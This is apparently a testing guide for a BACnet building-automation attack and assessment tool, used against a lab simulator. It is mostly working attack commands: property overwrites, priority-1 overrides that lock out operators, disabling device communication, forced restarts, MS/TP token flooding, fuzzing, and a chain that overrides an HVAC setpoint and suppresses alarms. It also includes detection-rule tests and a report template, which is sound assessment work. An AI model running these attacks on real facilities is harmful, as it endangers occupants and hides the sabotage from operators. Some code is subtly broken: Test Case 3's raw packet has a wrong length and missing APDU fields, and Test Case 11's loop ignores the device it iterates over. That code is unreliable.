# BACnet Security Assessment Framework - Testing Guide

Comprehensive testing procedures for BACnet security assessment capabilities.

## Testing Environment Setup

### Option 1: BACnet Stack Simulator (Recommended)

**BACnet Protocol Stack from Steve Karg**:
```bash
git clone https://github.com/bacnet-stack/bacnet-stack.git
cd bacnet-stack
make clean all
cd bin
./bacserv 1234
```

This creates a virtual BACnet device with instance ID 1234 on UDP port 47808.

### Option 2: YABE (Yet Another BACnet Explorer)

Download from: https://sourceforge.net/projects/yetanotherbacnetexplorer/

1. Install YABE on Windows
2. Create virtual BACnet device
3. Configure objects (Analog Inputs, Outputs, etc.)
4. Use as test target

### Option 3: VTS (Visual Test Shell)

Official BACnet conformance testing tool:
1. Download from BACnet International (requires membership)
2. Create virtual devices and objects
3. Comprehensive BACnet/IP and MS/TP support

### Network Configuration

```bash
Target Network: 192.168.100.0/24
Test Machine: 192.168.100.50
BACnet Device: 192.168.100.100 (Instance 1234)
Broadcast: 192.168.100.255
```

### MS/TP Testing Setup

**Hardware Requirements**:
- USB to RS-485 adapter
- RS-485 termination resistors (120Ω)
- BACnet MS/TP devices or simulator

**Serial Configuration**:
- Baud Rate: 38400 (default) or 76800
- Data Bits: 8
- Parity: None
- Stop Bits: 1

## Test Case 1: Device Discovery

**Objective**: Verify Who-Is/I-Am device discovery mechanism.

**Command**:
```bash
python bacnet_assessment.py --target 192.168.100.255 --discover --export-devices discovered_devices.json
```

**Expected Results**:
- Broadcast Who-Is on UDP port 47808
- Receive I-Am responses from all devices
- Extract device instance numbers and IP addresses
- JSON export contains device information

**PCAP Validation**:
```bash
tcpdump -i eth0 -w bacnet_discovery.pcap udp port 47808
tshark -r bacnet_discovery.pcap -Y "bacapp.type == 8" -T fields -e ip.src -e bacapp.instance_number
```

**Expected PCAP**:
1. Who-Is broadcast from 192.168.100.50 to 192.168.100.255
2. I-Am response from 192.168.100.100 containing instance 1234
3. BVLC function code 0x0B (Original-Broadcast-NPDU)
4. NPDU control 0x20 (broadcast)

**MITRE Techniques**: T0888, T0868

---

## Test Case 2: Object Enumeration

**Objective**: Enumerate all objects on a BACnet device.

**Command**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --enumerate --device-id 1234 --export-objects enumerated_objects.json
```

**Expected Results**:
- Read OBJECT_LIST property from Device object
- Extract all object types and instances
- JSON export contains complete object inventory

**Manual Verification**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --enumerate --device-id 1234 2>&1 | grep -E "(Analog|Binary|Multi)"
```

Count enumerated objects and compare with device configuration.

**PCAP Validation**:
```bash
tshark -r bacnet_enum.pcap -Y "bacapp.confirmed_service == 12" -T fields -e bacapp.objectType -e bacapp.instance_number
```

**Expected PCAP**:
1. Read Property request for object type DEVICE (8), property OBJECT_LIST (76)
2. Complex ACK response containing encoded object list
3. Confirmed service code 12 (Read Property)

**MITRE Techniques**: T0861, T0888

---

## Test Case 3: WriteProperty Attack

**Objective**: Modify object property value using WriteProperty service.

**Setup**:
```bash
bacserv 1234
python -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = b'\x81\x0A\x00\x11\x01\x04\x00\x02\x0F\x0C\x00\x40\x00\x00\x19\x55\x3E\x44\x42\xC8\x00\x00\x3F'
s.sendto(data, ('192.168.100.100', 47808))
"
```

**Attack Command**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --write-property \
  --device-id 1234 --object-type 1 --object-instance 0 \
  --property 85 --value 100.0 --priority 8
```

**Expected Results**:
- WriteProperty confirmed request sent
- Simple ACK response received
- Property value changed to 100.0
- Security event logged with MITRE tags T0855, T0836

**Verification**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --read-property \
  --device-id 1234 --object-type 1 --object-instance 0 --property 85
```

Read back the property to confirm value is 100.0.

**PCAP Analysis**:
```bash
tshark -r bacnet_write.pcap -Y "bacapp.confirmed_service == 15" -V
```

**Expected PCAP Structure**:
```
BACnet BVLC
  Type: BACnet/IP (Annex J) (0x81)
  Function: Original-Unicast-NPDU (0x0A)
  BVLC-Length: varies
BACnet NPDU
  Version: 0x01
  Control: 0x04 (expecting reply)
BACnet APDU
  PDU Type: Confirmed-Request (0x00)
  Segmentation: 0x00
  Invoke ID: varies
  Service Choice: WriteProperty (15)
  Object Identifier: Analog Output:0 (0x01000000)
  Property Identifier: Present Value (85)
  Property Array Index: absent
  Property Value: REAL 100.0
  Priority: 8
```

**MITRE Techniques**: T0855, T0836

---

## Test Case 4: Priority Array Manipulation

**Objective**: Override control through priority array writes.

**Command**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --priority-array \
  --device-id 1234 --object-type 1 --object-instance 0 \
  --priority 1 --value 75.0
```

**Expected Results**:
- Write to PRESENT_VALUE at priority 1 (Manual-Life Safety)
- Value overrides all lower priorities (2-16)
- Operator cannot override without clearing priority 1

**Verification**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --read-property \
  --device-id 1234 --object-type 1 --object-instance 0 --property 87
```

Read PRIORITY_ARRAY (87) to see all 16 priority slots. Priority 1 should contain 75.0.

**Attack Impact**:
- Normal HMI writes at priority 8 have no effect
- Automated control at priorities 9-16 has no effect
- Only manual relinquish at priority 1 can restore control

**MITRE Techniques**: T0855, T0836

---

## Test Case 5: Device Communication Control

**Objective**: Block device communication using DCC service.

**Command**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --comm-control \
  --device-id 1234 --mode 1
```

**Expected Results**:
- Device Communication Control confirmed request sent
- Device enters DISABLE mode
- Device stops initiating communication
- Device may still respond to requests

**Verification**:
Monitor network traffic after DCC:
```bash
tcpdump -i eth0 -c 100 src 192.168.100.100 and udp port 47808
```

Expect significant reduction or absence of initiated communication (COV notifications, I-Am, etc.).

**PCAP Analysis**:
```bash
tshark -r bacnet_dcc.pcap -Y "bacapp.confirmed_service == 17" -V
```

**Expected PCAP**:
```
Service Choice: DeviceCommunicationControl (17)
  Time Duration: 0 (optional)
  Enable/Disable: DISABLE (1)
  Password: absent (or present)
```

**Recovery**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --comm-control \
  --device-id 1234 --mode 0
```

**MITRE Techniques**: T0803, T0804

---

## Test Case 6: Device Reinitialization

**Objective**: Force device restart using ReinitializeDevice service.

**Command**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --reinitialize \
  --device-id 1234 --state 1
```

**Expected Results**:
- ReinitializeDevice confirmed request sent
- Device performs warm restart (state 1)
- Temporary loss of communication during restart
- Device returns with same configuration

**States**:
- 0 = COLDSTART (full reset, reload config from flash)
- 1 = WARMSTART (restart without config reload)

**Verification**:
```bash
watch -n 1 "python bacnet_assessment.py --target 192.168.100.100 --discover 2>&1 | grep 1234"
```

Device should disappear briefly, then reappear after restart.

**PCAP Analysis**:
```bash
tshark -r bacnet_reinit.pcap -Y "bacapp.confirmed_service == 20" -V
```

**Expected PCAP**:
```
Service Choice: ReinitializeDevice (20)
  Reinitialized State of Device: WARMSTART (1)
  Password: absent (or present)
```

**MITRE Techniques**: T0858, T0871

---

## Test Case 7: COV Subscription

**Objective**: Subscribe to Change-of-Value notifications.

**Command**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --subscribe-cov \
  --device-id 1234 --object-type 2 --object-instance 5
```

**Expected Results**:
- SubscribeCOV confirmed request sent
- Simple ACK response received
- Device sends COV notifications when Analog Value 5 changes

**Triggering COV**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --write-property \
  --device-id 1234 --object-type 2 --object-instance 5 \
  --property 85 --value 123.45 --priority 8
```

**Capture Notifications**:
```bash
tcpdump -i eth0 -w bacnet_cov.pcap dst 192.168.100.50 and udp port 47808
tshark -r bacnet_cov.pcap -Y "bacapp.unconfirmed_service == 2"
```

**Expected COV Notification PCAP**:
```
Unconfirmed Service Choice: UnconfirmedCOVNotification (2)
  Process Identifier: varies
  Initiating Device Identifier: DEVICE:1234
  Monitored Object Identifier: Analog Value:5
  Time Remaining: varies
  List of Values:
    Present Value: 123.45
    Status Flags: 0x00
```

**MITRE Techniques**: T0801, T0802

---

## Test Case 8: Atomic File Write

**Objective**: Write to BACnet File object.

**Setup**:
Create File object on BACnet device (requires VTS or advanced simulator).

**Command**:
```bash
echo "Malicious Control Logic" > malicious.txt
python bacnet_assessment.py --target 192.168.100.100 --atomic-write-file \
  --device-id 1234 --file-instance 0 --file-data "$(cat malicious.txt)"
```

**Expected Results**:
- AtomicWriteFile confirmed request sent
- File data written to File object instance 0
- Complex ACK with file position returned

**Verification**:
Use AtomicReadFile to retrieve written data:
```bash
python bacnet_assessment.py --target 192.168.100.100 --atomic-read-file \
  --device-id 1234 --file-instance 0 --start-position 0 --count 100
```

**PCAP Analysis**:
```bash
tshark -r bacnet_file_write.pcap -Y "bacapp.confirmed_service == 7" -V
```

**Expected PCAP**:
```
Service Choice: AtomicWriteFile (7)
  File Identifier: FILE:0
  Access Method: streamAccess (1)
    File Start Position: 0
    File Data: "Malicious Control Logic"
```

**MITRE Techniques**: T0873, T0871

---

## Test Case 9: MS/TP Token Manipulation

**Objective**: Disrupt MS/TP token passing.

**Hardware Setup**:
- Connect USB-RS485 adapter to test PC
- Connect to MS/TP network with 120Ω termination
- Verify correct polarity (A/B or Data+/Data-)

**Command**:
```bash
python bacnet_assessment.py --mstp-token --serial-port /dev/ttyUSB0 \
  --this-station 5 --next-station 5
```

**Expected Results**:
- Continuous token frames transmitted on RS-485
- Normal token rotation disrupted
- Legitimate devices unable to transmit
- Network communication severely degraded

**Serial Capture**:
```bash
cat /dev/ttyUSB0 | hexdump -C > mstp_capture.hex
```

**Expected Frame Structure**:
```
Preamble: 0x55 0xFF
Frame Type: 0x00 (Token)
Destination Address: 0x05 (next_station)
Source Address: 0x05 (this_station)
Length: 0x00 0x00
Header CRC: calculated
Data CRC: 0xFF 0xFF (no data)
```

**Recovery**:
Stop the attack script to restore normal token passing.

**MITRE Techniques**: T0803, T0804

---

## Test Case 10: Protocol Fuzzing

**Objective**: Discover vulnerabilities through fuzzing.

**Command**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --fuzz \
  --device-id 1234 --service 15 --iterations 500
```

**Expected Results**:
- 500 WriteProperty requests with random data payloads
- Device handles malformed packets gracefully OR
- Device crashes, restarts, or exhibits unexpected behavior

**Monitoring**:
```bash
watch -n 1 "python bacnet_assessment.py --target 192.168.100.100 --discover 2>&1 | grep 1234"
```

If device disappears from network, fuzzing triggered a crash.

**PCAP Analysis**:
```bash
tshark -r bacnet_fuzz.pcap -Y "bacapp.confirmed_service == 15" -T fields -e data | head -20
```

Examine randomized payload data in each request.

**Vulnerability Indicators**:
- Device becomes unresponsive
- Device restarts unexpectedly
- Memory corruption errors in device logs
- Undefined behavior (incorrect responses)

**MITRE Techniques**: T0855

---

## Test Case 11: Multi-Device Assessment

**Objective**: Assess multiple devices in enterprise environment.

**Automated Workflow**:
```bash
python bacnet_assessment.py --target 192.168.100.255 --discover --export-devices devices.json

for device in $(jq -r '.[].instance_number' devices.json); do
  python bacnet_assessment.py --target 192.168.100.100 --enumerate \
    --device-id $device --export-objects "objects_${device}.json"
done

for device in $(jq -r '.[].instance_number' devices.json); do
  for obj in $(jq -r '.[] | select(.object_type == 1) | .instance_number' "objects_${device}.json"); do
    python bacnet_assessment.py --target 192.168.100.100 --write-property \
      --device-id $device --object-type 1 --object-instance $obj \
      --property 85 --value 99.9 --priority 8
  done
done
```

**Expected Results**:
- Comprehensive device inventory
- Complete object enumeration per device
- Automated WriteProperty attacks on all Analog Outputs
- Consolidated security event logs

---

## Test Case 12: Detection Rule Validation

**Objective**: Verify Suricata/Zeek detection rules trigger on attacks.

**Suricata Setup**:
```bash
suricata -c /etc/suricata/suricata.yaml -r bacnet_attack.pcap -l logs/
cat logs/fast.log | grep -i bacnet
```

**Expected Alerts**:
- SID 400017: BACnet WriteProperty with high priority
- SID 400018: BACnet Device Communication Control
- SID 400019: BACnet Reinitialize Device
- SID 400020: BACnet Atomic Write File

**Zeek Script**:
```bash
zeek -r bacnet_attack.pcap /path/to/bacnet_monitor.zeek
cat bacnet_security.log
```

**Expected Logs**:
```json
{
  "ts": 1234567890.123,
  "service": "WriteProperty",
  "severity": "CRITICAL",
  "details": "High priority write (priority 1)"
}
```

---

## Test Case 13: False Positive Analysis

**Objective**: Ensure legitimate operations don't trigger false positives.

**Legitimate Operations**:
```bash
python bacnet_assessment.py --target 192.168.100.100 --read-property \
  --device-id 1234 --object-type 1 --object-instance 0 --property 85

python bacnet_assessment.py --target 192.168.100.100 --write-property \
  --device-id 1234 --object-type 1 --object-instance 0 \
  --property 85 --value 72.0 --priority 15
```

**Expected Results**:
- Read operations: No alerts (normal monitoring)
- Write at priority 15: No alert (normal automated control)
- Write at priority 8: LOW severity (operator HMI)
- Write at priority 1-7: HIGH/CRITICAL severity (override)

**Tuning Guidelines**:
- Whitelist authorized HMI IP addresses
- Set priority thresholds (alert on priority < 8)
- Use time-based rules (alert on writes outside business hours)

---

## Test Case 14: Integration Testing

**Objective**: Test complete attack chain.

**Scenario**: HVAC Setpoint Manipulation

```bash
BROADCAST="192.168.100.255"
TARGET="192.168.100.100"
DEVICE_ID=1234

echo "[*] Step 1: Device Discovery"
python bacnet_assessment.py --target $BROADCAST --discover

echo "[*] Step 2: Object Enumeration"
python bacnet_assessment.py --target $TARGET --enumerate --device-id $DEVICE_ID

echo "[*] Step 3: Identify Cooling Setpoint (Analog Output 10)"
AO_INSTANCE=10

echo "[*] Step 4: Read Current Value"
python bacnet_assessment.py --target $TARGET --read-property \
  --device-id $DEVICE_ID --object-type 1 --object-instance $AO_INSTANCE --property 85

echo "[*] Step 5: Override Setpoint at Priority 1"
python bacnet_assessment.py --target $TARGET --priority-array \
  --device-id $DEVICE_ID --object-type 1 --object-instance $AO_INSTANCE \
  --priority 1 --value 90.0

echo "[*] Step 6: Subscribe to COV for Monitoring"
python bacnet_assessment.py --target $TARGET --subscribe-cov \
  --device-id $DEVICE_ID --object-type 1 --object-instance $AO_INSTANCE

echo "[*] Step 7: Block Alarm Reporting"
python bacnet_assessment.py --target $TARGET --comm-control \
  --device-id $DEVICE_ID --mode 1

echo "[*] Attack Complete - Setpoint overridden, alarms suppressed"
```

**Expected Results**:
- Complete attack chain execution
- Setpoint changed to 90.0°F
- Alarm reporting disabled
- No operator alerts
- COV monitoring confirms persistence

---

## Performance Testing

### Throughput Testing
```bash
time for i in {1..100}; do
  python bacnet_assessment.py --target 192.168.100.100 --read-property \
    --device-id 1234 --object-type 1 --object-instance 0 --property 85 >/dev/null
done
```

Calculate requests per second and average latency.

### Resource Monitoring
```bash
while true; do
  ps aux | grep bacnet_assessment.py | grep -v grep
  sleep 1
done
```

Monitor CPU and memory usage during fuzzing operations.

---

## Troubleshooting

### No I-Am Responses
- Verify network connectivity (ping target)
- Check firewall rules (UDP 47808)
- Confirm broadcast address is correct
- Verify BACnet device is running

### Write Property Failures
- Check object write protection settings
- Verify password requirements
- Ensure object supports writing (out-of-service = false)
- Confirm data type matches property

### MS/TP Communication Issues
- Verify RS-485 wiring (A/B polarity)
- Check baud rate (38400 default)
- Ensure termination resistors (120Ω at both ends)
- Verify station address conflicts

### PCAP Analysis Tools
```bash
tshark -G column-formats
tshark -G protocols | grep -i bacnet
tshark -r capture.pcap -Y "bacapp" -T pdml > bacnet.xml
```

---

## Validation Checklist

- [ ] Device discovery finds all configured devices
- [ ] Object enumeration matches device configuration
- [ ] WriteProperty successfully modifies values
- [ ] Priority array manipulation overrides lower priorities
- [ ] Device Communication Control blocks communication
- [ ] ReinitializeDevice causes device restart
- [ ] COV subscriptions receive notifications
- [ ] Atomic File Write modifies file contents
- [ ] MS/TP token manipulation disrupts network
- [ ] Protocol fuzzing completes without framework errors
- [ ] Detection rules trigger on attack traffic
- [ ] False positive rate is acceptable (<5% on legitimate traffic)
- [ ] Security events logged with correct MITRE tags
- [ ] JSON export files are valid and complete

---

## Compliance Testing

### ASHRAE 135 Conformance
- Verify BVLC function codes match specification
- Confirm APDU encoding follows standard
- Validate service request/response pairs
- Check property encoding (context vs. application tags)

### NIST SP 800-82 Alignment
- Network segmentation testing
- Authentication bypass verification
- Audit logging validation
- Incident response readiness

---

## Reporting

### Security Assessment Report Template

```
BACnet Security Assessment Report
Date: [Date]
Assessor: [Name]
Target Environment: [Description]

Executive Summary:
- [Number] devices discovered
- [Number] objects enumerated
- [Number] vulnerabilities identified
- Risk rating: [Critical/High/Medium/Low]

Findings:
1. Unauthenticated WriteProperty Access
   - Severity: Critical
   - MITRE: T0855, T0836
   - Recommendation: Enable password protection

2. No Communication Control Restrictions
   - Severity: High
   - MITRE: T0803, T0804
   - Recommendation: Implement access control lists

Technical Details:
[Include PCAP analysis, logs, screenshots]

Recommendations:
[Prioritized remediation plan]
```

---

## Version

BACnet Security Assessment Framework Testing Guide v1.0

See implementation: `tools/bacnet_security_assessment/bacnet_assessment.py`
